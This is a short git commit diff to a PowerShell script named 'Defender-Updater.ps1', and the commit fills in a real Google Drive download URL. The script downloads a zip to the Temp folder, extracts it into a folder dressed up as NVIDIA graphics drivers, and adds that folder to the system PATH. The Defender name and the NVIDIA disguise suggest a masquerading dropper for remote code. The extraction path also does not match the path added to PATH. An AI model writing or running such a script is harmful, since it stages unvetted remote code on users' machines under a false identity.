f066ef1cf482164dbdb5546fa539050c68f2a0d7
Rugved <quad.powered@gmail.com>
2024-07-26 11:15:51 +0100

    Adding the url

--- Defender-Updater.ps1
+++ Defender-Updater.ps1
@@ -1,5 +1,5 @@
 $username=[Environment]::UserName
-$zipFile = "https://drive.google.com/uc?export=download&id=1cwwPzYjIzzzzzzzzzzzzzzzzzzzzzzzz"
+$zipFile = "https://drive.usercontent.google.com/download?id=15Np4BGBn1QW0-VcmuRKzmnNIZ-TUOhHu&export=download&authuser=0&confirm=t&uuid=6318f008-dcf3-494b-bd06-bb1b63c29f45&at=APZUnTUO2mSixQhGiPPSBGYEOjRj:1721988761282"
 Invoke-WebRequest -Uri $zipFile -OutFile "C:\Users\$username\AppData\Local\Temp\updater.zip"
 Expand-Archive "C:\Users\$username\AppData\Local\Temp\updater.zip" -DestinationPath "C:\Users\Program Files\NVIDIA Graphics Drivers"
 $Path = [Environment]::GetEnvironmentVariable("PATH", "Machine")+';C:\Program Files\NVIDIA Graphics Drivers\bin;C:\Program Files\NVIDIA Graphics Drivers\include'
